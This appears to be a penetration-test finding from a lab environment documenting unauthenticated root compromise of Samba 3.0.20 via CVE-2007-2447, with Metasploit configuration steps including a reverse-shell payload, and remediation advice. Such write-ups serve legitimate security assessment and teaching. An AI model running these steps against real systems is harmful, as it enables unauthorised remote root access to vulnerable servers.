# Finding F04: Samba username map script Command Execution (CVE-2007-2447)

## Vulnerability Overview
* **Target:** 192.168.56.20:139 / 445
* **Service:** SMB / Samba (3.0.20-Debian)
* **Severity:** Critical (CVSS 10.0)
* **CVE:** CVE-2007-2447
* **Impact:** Unauthenticated Remote Code Execution yielding root privileges.
* **MITRE ATT&CK:** T1210 - Exploitation of Remote Services

## Technical Description
Samba versions 3.0.0 through 3.0.25rc3 allow arbitrary command execution when the `username map script` configuration option is enabled. Input validation failures on shell metacharacters in username fields allow remote unauthenticated attackers to execute commands via `/bin/sh`.

## Exploitation Proof
1. Configured Metasploit module `exploit/multi/samba/usermap_script`.
2. Set target parameters: `RHOSTS 192.168.56.20` and `LHOST 192.168.56.10`.
3. Executed `exploit` with payload `cmd/unix/reverse`.
4. Verified root level access (`uid=0(root)`).

## Remediation
* Upgrade Samba to version 3.0.25 or newer.
* Disable `username map script` in `smb.conf` if custom script execution is not required.
* Restrict SMB access (ports 139/445) to authorized subnet segments via firewall rules.
